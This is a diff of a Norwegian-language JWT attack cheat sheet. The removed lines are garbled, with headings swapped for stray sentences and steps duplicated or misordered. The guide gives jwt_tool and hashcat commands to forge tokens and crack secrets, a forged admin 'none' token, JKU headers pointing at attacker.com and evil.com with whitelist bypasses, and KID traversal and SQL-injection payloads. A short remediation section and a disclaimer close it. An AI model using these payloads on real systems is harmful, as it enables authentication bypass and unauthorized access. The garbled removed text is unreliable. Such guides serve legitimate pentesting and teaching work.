@@ -1,12 +1,16 @@
-# 🎟️ JWT-Attacks – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎟️ JWT-angrep - komplett jukseark
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
        ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
        ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
@@ -16,87 +20,81 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
              JSON Web Token Exploitation & Security Testing Guide
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
   <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
-  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
-  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
+  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Nøkkelangrep">
+  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API-testing">
 </p>
 
 <p align="center">
-  <b>🛡️ Comprehensive methodology and practical commands for exploiting JSON Web Token (JWT) vulnerabilities</b>
+  <b>🛡️ Omfattende metodikk og praktiske kommandoer for å utnytte JSON Web Token-sårbarheter (JWT)</b>
 </p>
 
 ---
 
 ## 📋 Innholdsfortegnelse
 
-- [Introduksjon](#-introduction--anatomy-of-a-jwt)
-- [Essential Testing Tools](#-essential-testing-tools)
-- [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
-  - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
-  - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
-  - [3. Algorithm Confusion / Key Confusion (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
+- [Introduction & Anatomy of a JWT](#-introduction--anatomy-of-a-jwt)
+– [Essential Testing Tools](#-essential-testing-tools)
+- [Sårbarhetsmatrise og angrepsvektorer](#-sårbarhetsmatrise--angrepsvektorer)
+  - [1. Ingen algoritmefeil (`alg: "none"`)](#1-ingen-algoritmefeil-alg-ingen)
+  - [2. Svak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
+  - [3. Algoritmeforvirring / nøkkelforvirring (RS256 -> HS256)](#3-algoritmeforvirring--nøkkelforvirring-rs256---hs256)
   - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
-  - [3. Sign the token with your matching private key.](#5-jku-jwk-set-url-misconfiguration--ssrf)
-  - [> - `https://trusted.com@attacker.com/jwks.json`](#6-kid-key-id-header-manipulation--injections)
-  - [Inject a known static string:](#7-cross-service-relaying--sensitive-data-leakage)
-- [Automating Tests with `jwt_tool`](#-automating-tests-with-jwt_tool)
-- [Cracking JWT Secrets with Hashcat](#-cracking-jwt-secrets-with-hashcat)
-- [Hurtigreferanse](#-quick-reference-table)
-- [Remediation & Secure Implementation](#-remediation--secure-implementation)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Ressurser og referanser](#-resources)
+  - [5. JKU (JWK Set URL) Feilkonfigurasjon og SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
+  - [6. KID (Key ID) Header Manipulation & Injections](#6-kid-key-id-header-manipulation--injections)
+  - [7. Cross-Service Relaying & Sensitive Data Leakage](#7-cross-service-relaying--sensitive-data-lekkage)
+- [Automatisering av tester med `jwt_tool`](#-automatiseringstester-med-jwt_tool)
+- [Knekker JWT-hemmeligheter med Hashcat](#-cracking-jwt-secrets-with-hashcat)
+- [Hurtigreferansetabell](#-hurtigreferansetabell)
+– [Remediation & Secure Implementation](#-remediation--secure-implementation)
+– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
+- [Ressurser](#-ressurser)
 
 ---
 
-## 🎯 Introduksjon
+## 🎯 Introduksjon og anatomi til en JWT
 
-A **JSON Web Token (JWT)** is a compact, URL-safe means of representing claims between two parties. Commonly used for session authentication in modern REST APIs, Single Page Applications (SPAs), and microservices.
+Et **JSON Web Token (JWT)** er en kompakt, URL-sikker måte å representere krav mellom to parter på. Vanligvis brukt for øktautentisering i moderne REST APIer, Single Page Applications (SPAer) og mikrotjenester.
 
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
-
+En standard JWT består av tre Base64URL-kodede deler atskilt med prikker (`.`):
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
 [------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
 ```
-
-1. **Header:** Identifies the token type and the cryptographic algorithm used (e.g., `HS256`, `RS256`, `none`).
-2. **Payload:** Contains the claims (e.g., `user_id`, `role`, expiration `exp`). *Note: Payloads are encoded, NOT encrypted!*
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
+1. **Overskrift:** Identifiserer tokentypen og den kryptografiske algoritmen som brukes (f.eks. `HS256`, `RS256`, `none`).
+2. **Nyttelast:** Inneholder kravene (f.eks. `user_id`, `role`, utløp `exp`). *Merk: Nyttelaster er kodet, IKKE kryptert!*
+3. **Signatur:** Laget ved å hashe den kodede overskriften og nyttelasten ved hjelp av en hemmelig nøkkel eller privat nøkkel.
 
 ---
 
-## 🛠️ Essential Testing Tools
+## 🛠️ Essensielle testverktøy
 
-3. **Signature:** Created by hashing the encoded Header and Payload using a secret key or private key.
-2. **Hashcat:** Fast GPU-based HMAC secret cracking (Mode `16500`).
-3. **Burp Suite Extension:** "JWT Editor" by Fraser Winterborn (in PortSwigger BApp Store).
+1. **jwt_tool:** Kommandolinjeverktøy for å analysere, teste og knekke JWT-er.
+2. **Hashcat:** Rask GPU-basert HMAC-hemmelig cracking (Mode `16500`).
+3. **Burp Suite Extension:** "JWT Editor" av Fraser Winterborn (i PortSwigger BApp Store).
 
-### 🛠️ Essential Testing Tools
-
+### Installerer `jwt_tool`
 ```bash
 git clone https://github.com/ticarpi/jwt_tool
 cd jwt_tool
 python3 -m pip install -r requirements.txt
 alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
 ```
-
 ---
 
-## 💥 Vulnerability Matrix & Attack Vectors
+## 💥 Sårbarhetsmatrise og angrepsvektorer
 
-### 1. None Algorithm Flaw (`alg: "none"`)
+### 1. Ingen algoritmefeil (`alg: "none"`)
 
-**Mechanism:**
-Some JWT verification libraries consider tokens valid if the `alg` header is set to `none`, completely bypassing signature verification.
+**Mekanisme:**
+Noen JWT-verifiseringsbiblioteker anser tokens som gyldige hvis `alg`-overskriften er satt til `none`, og omgår fullstendig signaturverifisering.
 
-**Exploitation:**
-1. None Algorithm Flaw (`alg: "none"`)
-2. Modify payload claims (e.g., `"role": "admin"`).
-Mechanism:
-
+**Utnyttelse:**
+1. Dekode overskriften og endre `"alg": "HS256"` til `"alg": "none"`.
+2. Endre nyttelastkrav (f.eks. `"role": "admin"`).
+3. Fjern signaturdelen (behold den etterfølgende prikken!).
 ```bash
 # Using jwt_tool to forge 'none' algorithm token
 python3 jwt_tool.py <TOKEN> -X a
@@ -104,20 +102,18 @@ python3 jwt_tool.py <TOKEN> -X a
 # Test various casing variations (none, None, NONE, nOnE)
 python3 jwt_tool.py <TOKEN> -T -S none
 ```
-
-*Manual Token Structure:*
+*Manuell tokenstruktur:*
 ```text
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
 ```
-
 ---
 
-### 2. Weak HMAC Secret Cracking (HS256)
+### 2. Svak HMAC Secret Cracking (HS256)
 
-**Mechanism:**
-If the server signs tokens using symmetric algorithms (`HS256`, `HS384`, `HS512`) with a guessable or weak secret key (e.g., `secret`, `admin123`, company name), an attacker can brute-force the secret offline and sign arbitrary tokens.
+**Mekanisme:**
+Hvis serveren signerer tokens ved hjelp av symmetriske algoritmer (`HS256`, `HS384`, `HS512`) med en gjettbar eller svak hemmelig nøkkel (f.eks. `secret`, `admin123`, firmanavn), kan en angriper brute-force hemmeligheten offline og signere vilkårlige tokens.
 
-**Cracking with Hashcat:**
+**Cracking med Hashcat:**
 ```bash
 # Save the full JWT to a file
 echo "eyJhbGciOi..." > jwt.txt
@@ -125,58 +121,53 @@ echo "eyJhbGciOi..." > jwt.txt
 # Crack using Hashcat Mode 16500 (JWT Secret)
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 ```
-
-**Forging Token After Cracking:**
+**Smibrikke etter sprekking:**
 ```bash
 python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
 ```
-
 ---
 
-### 3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
+### 3. Algoritmeforvirring / nøkkelforvirring (RS256 -> HS256)
 
-**Mechanism:**
-- **RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-- **HS256 (Symmetric)**: Signed and verified with the **same shared secret**.
+**Mekanisme:**
+- **RS256 (asymmetrisk):** Signert med serverens private nøkkel; verifisert med serverens **offentlige nøkkel**.
+- **HS256 (symmetrisk):** Signert og bekreftet med **samme delte hemmelighet**.
 
-3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
-1. Obtain the server's public key (often publicly exposed at `/.well-known/jwks.json` or certificates).
-Mechanism:
-RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-4. The server receives the token, sees `HS256`, and verifies the signature using its configured verification key (which is its public key), resulting in a valid signature!
+Hvis backend-biblioteket ikke strengt håndhever algoritmetyper, kan en angriper:
+1. Skaff serverens offentlige nøkkel (ofte offentlig eksponert på `/.well-known/jwks.json` eller sertifikater).
+2. Endre tokens algoritmehode fra `RS256` til `HS256`.
+3. Signer det modifiserte tokenet med serverens **offentlige nøkkel** som HMAC-hemmeligheten!
+4. Serveren mottar tokenet, ser `HS256` og verifiserer signaturen ved å bruke dens konfigurerte verifikasjonsnøkkel (som er dens offentlige nøkkel), noe som resulterer i en gyldig signatur!
 
-**Exploitation via `jwt_tool`:**
+**Utnyttelse via `jwt_tool`:**
 ```bash
 # Supply the server's public key and perform key confusion
 python3 jwt_tool.py <TOKEN> -X k -pk public.pem
 ```
-
 ---
 
 ### 4. JWK (JSON Web Key) Header Injection
 
-**Mechanism:**
-The JWT specification allows an embedded public key in the `jwk` header parameter. Vulnerable servers trust this header key to verify the signature without checking if the key belongs to a trusted CA or pre-shared whitelist.
+**Mekanisme:**
+JWT-spesifikasjonen tillater en innebygd offentlig nøkkel i `jwk`-headerparameteren. Sårbare servere stoler på denne overskriftsnøkkelen for å bekrefte signaturen uten å sjekke om nøkkelen tilhører en klarert CA eller forhåndsdelt hviteliste.
 
-**Exploitation:**
-4. JWK (JSON Web Key) Header Injection
-2. Embed the public key in the `jwk` header.
-Mechanism:
-
+**Utnyttelse:**
+1. Generer et angriper-RSA-nøkkelpar.
+2. Bygg inn den offentlige nøkkelen i `jwk`-overskriften.
+3. Signer tokenet med den tilhørende private nøkkelen.
 ```bash
 # Inject self-signed key in header using jwt_tool
 python3 jwt_tool.py <TOKEN> -X i
 ```
-
 ---
 
-### 3. Sign the token with your matching private key.
+### 5. JKU (JWK Set URL) Feilkonfigurasjon og SSRF
 
-**Mechanism:**
-The `jku` (JWK Set URL) header specifies a remote URL from which the server should fetch the public key set to verify the token.
+**Mekanisme:**
+Overskriften `jku` (JWK Set URL) spesifiserer en ekstern URL som serveren skal hente det offentlige nøkkelsettet fra for å bekrefte tokenet.
 
-**Exploitation:**
-5. JKU (JWK Set URL) Misconfiguration & SSRF
+**Utnyttelse:**
+1. Vert din egen `jwks.json` på en angriperwebserver:
    ```json
    {
      "keys": [
@@ -190,7 +181,7 @@ The `jku` (JWK Set URL) header specifies a remote URL from which the server shou
      ]
    }
    ```
-Mechanism:
+2. Endre token-overskriften:
    ```json
    {
      "alg": "RS256",
@@ -199,22 +190,22 @@ Mechanism:
      "kid": "attacker-key"
    }
    ```
-3. Sign the token with your private key.
+3. Signer tokenet med din private nøkkel.
 
-> **Bypassing URL Whitelists:**
-> If the application validates domain endings, test open redirects or URL parsing quirks:
-2. Modify the token header:
+> **Omgå nettadressehvitelister:**
+> Hvis applikasjonen validerer domeneendelser, test åpne omdirigeringer eller nettadresseparsing:
+> - `https://trusted.com@attacker.com/jwks.json`
 > - `https://trusted.com.attacker.com/jwks.json`
-3. Sign the token with your private key.
+> - Åpen viderekobling: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
 
 ---
 
-### > - `https://trusted.com@attacker.com/jwks.json`
+### 6. KID (Nøkkel-ID) Header Manipulation & Injeksjoner
 
-> - Open redirect: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
+`kid`-headeren er en streng som brukes til å identifisere hvilken nøkkel som skal lastes fra en database eller et filsystem.
 
-#### A. Directory Traversal to Empty File (`/dev/null`)
-If the server reads the key file from disk using `kid`:
+#### A. Kataloggjennomgang til tom fil (`/dev/null`)
+Hvis serveren leser nøkkelfilen fra disk ved hjelp av `kid`:
 ```json
 {
   "alg": "HS256",
@@ -222,14 +213,14 @@ If the server reads the key file from disk using `kid`:
   "kid": "/dev/null"
 }
 ```
-Sign the token with an empty secret (`""` / 0 bytes)!
+Signer tokenet med en tom hemmelighet (`""` / 0 bytes)!
 
-#### B. SQL Injection via KID
-A. Directory Traversal to Empty File (`/dev/null`)
+#### B. SQL-injeksjon via KID
+Hvis serveren henter hemmeligheten fra en database:
 ```sql
 SELECT secret FROM keys WHERE kid = 'INPUT';
 ```
-Inject a known static string:
+Injiser en kjent statisk streng:
 ```json
 {
   "alg": "HS256",
@@ -237,37 +228,33 @@ Inject a known static string:
   "kid": "key' UNION SELECT 'my_known_secret'-- -"
 }
 ```
-Sign the token using the secret `'my_known_secret'`.
+Signer tokenet med den hemmelige `'my_known_secret'`.
 
 ---
 
-### Inject a known static string:
+### 7. Videresending på tvers av tjenester og sensitive datalekkasjer
 
-- **Unencrypted PII**: Developers frequently store passwords, SSNs, or sensitive user metadata in the payload, forgetting it is only Base64URL-encoded, not encrypted.
-- **Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
+- **Ukryptert PII:** Utviklere lagrer ofte passord, SSN-er eller sensitive brukermetadata i nyttelasten, og glemmer at den bare er Base64URL-kodet, ikke kryptert.
+- **Tjenesteforvirring:** Bruk av et token beregnet på en tjeneste med lav privilegium (f.eks. analytics API) mot en intern administrativ API.
 
 ---
 
-## ⚡ Automating Tests with `jwt_tool`
+## ⚡ Automatisering av tester med `jwt_tool`
 
-### Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
-The easiest way to scan for all known vulnerabilities automatically:
-
+### Kjør alle innebygde Playbook-angrep
+Den enkleste måten å skanne etter alle kjente sårbarheter automatisk:
 ```bash
 # Launch full automated playbook scan
 python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
 ```
-
-### Interactive Tampering Mode
+### Interaktiv manipuleringsmodus
 ```bash
 # Interactively edit header or payload claims
 python3 jwt_tool.py <TOKEN> -T
 ```
-
 ---
 
-## 🔓 Cracking JWT Secrets with Hashcat
-
+## 🔓 Å knekke JWT-hemmeligheter med Hashcat
 ```bash
 # 1. Format: Put token alone in a file
 echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt
@@ -278,45 +265,44 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3
 # 3. Rule-based attack
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
+---
+
+## 📊 Hurtigreferansetabell
+
+| Sårbarhet | Angrepsteknikk | Nøkkel nyttelast / flagg |
+|--------------|------------------------|------------------------|
+| **Ingen Algoritme** | Sett `alg: "none"`, stripsignatur | `jwt_tool <TOKEN> -X a` |
+| **Svak hemmelighet** | GPU-ordbok brute-force | `hashcat -m 16500 jwt.txt rockyou.txt` |
+| **Algoritmeforvirring**| Endre RS256 til HS256, skilt med offentlig nøkkel | `jwt_tool <TOKEN> -X k -pk pub.pem` |
+| **JWK Injection** | Bygg inn angriperens offentlige nøkkel i overskriften | `jwt_tool <TOKEN> -X i` |
+| **JKU-injeksjon** | Pek `jku` til ekstern server | `"jku": "http://evil.com/jwks.json"` |
+| **KID Traversal Path**| Pek `kid` til `/dev/null` eller kjent fil | `"kid": "/dev/null"` (Sign med `""`) |
+| **KID SQLi** | Injiser statisk hemmelighet i SQL-spørring | `"kid": "' UNION SELECT 'secret'-- -"` |
 
 ---
 
-## 📊 Hurtigreferanse
+## 🛡️ Utbedring og sikker implementering
 
-|Vulnerability|Attack Technique|Key Payload / Flag|
-|---------------|------------------|--------------------|
-|**None Algorithm**|Set `alg: "none"`, strip signature|`jwt_tool <TOKEN> -X a`|
-|**Weak Secret**|GPU dictionary brute-force|`hashcat -m 16500 jwt.txt rockyou.txt`|
-|**Algorithm Confusion**|Change RS256 to HS256, sign with public key|`jwt_tool <TOKEN> -X k -pk pub.pem`|
-|**JWK Injection**|Embed attacker public key in header|`jwt_tool <TOKEN> -X i`|
-|**JKU Injection**|Point `jku` to external server|`"jku": "http://evil.com/jwks.json"`|
-|**KID Path Traversal**|Point `kid` to `/dev/null` or known file|`"kid": "/dev/null"` (Sign with `""`)|
-|**KID SQLi**|Inject static secret into SQL query|`"kid": "' UNION SELECT 'secret'-- -"`|
-
----
-
-## 🛡️ Remediation & Secure Implementation
-
-1. **Explicitly Whitelist Algorithms:**
-   Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-2. **Reject `alg: none` Tokens:**
-   Ensure the library strictly rejects unverified or unsigned tokens.
-3. **Use Long, Cryptographically Secure Secrets:**
-   HMAC secrets must be at least 256 bits (32+ random characters) generated by a secure CSPRNG.
-4. **Validate `jku` and `jwk` Headers:**
-Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-5. **Sanitize `kid` Values:**
-Ensure the library strictly rejects unverified or unsigned tokens.
+1. **Eksplisitt hvitelistealgoritmer:**
+   Tillat aldri klientstyrt `alg`-valg. Hardcode tillatte algoritmer på serveren (tillater for eksempel utelukkende `RS256`).
+2. **Avvis `alg: none`-tokens:**
+   Sørg for at biblioteket strengt avviser uverifiserte eller usignerte tokens.
+3. **Bruk lange, kryptografisk sikre hemmeligheter:**
+   HMAC-hemmeligheter må være minst 256 biter (32+ tilfeldige tegn) generert av en sikker CSPRNG.
+4. **Valider `jku`- og `jwk`-overskrifter:**
+   Hent kun JWK-sett fra en streng hviteliste over interne pålitelige URL-er; avvise brukerleverte eksterne domener.
+5. **Desinfisering av `kid`-verdier:**
+   Behandle `kid` som uklarert brukerinndata; rense mot kataloggjennomgang (`../`) og SQL-injeksjon.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Juridisk ansvarsfraskrivelse
 
-> **IMPORTANT:** JWT attacks can lead to full authentication bypass and unauthorized access to application databases. This guide is strictly intended for educational purposes and authorized penetration testing.
+> **VIKTIG:** JWT-angrep kan føre til fullstendig omgåelse av autentisering og uautorisert tilgang til applikasjonsdatabaser. Denne veiledningen er strengt ment for utdanningsformål og autorisert penetrasjonstesting.
 
 ---
 
-## 📚 Ressurser og referanser
+## 📚 Ressurser
 
 - [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
 - [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
